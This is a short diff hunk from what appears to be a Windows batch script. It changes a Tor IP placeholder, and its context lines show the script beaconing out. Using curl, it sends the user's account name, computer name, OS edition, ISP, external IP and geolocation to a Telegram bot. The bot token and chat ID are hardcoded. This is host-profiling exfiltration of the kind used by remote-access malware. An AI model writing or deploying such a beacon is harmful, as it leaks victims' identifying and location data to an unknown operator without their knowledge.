@@ -58,7 +58,7 @@ for /f "tokens=*" %%A in (
   'curl %proxy% ipinfo.io/ip'
 ) Do set ExtIPTor=%%A
 ) else (
-set "ExtIPTor="
+set "ExtIPTor=N/A"
 )
 
 curl.exe %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [Tor is enabled: %TorStatus% (%ExtIPTor%)] " https://api.telegram.org/bot2069537898:AAEpaEeE32SSpft-gQ97Onau02dbQ6ZY2Ss/sendMessage?chat_id=-1001589929429
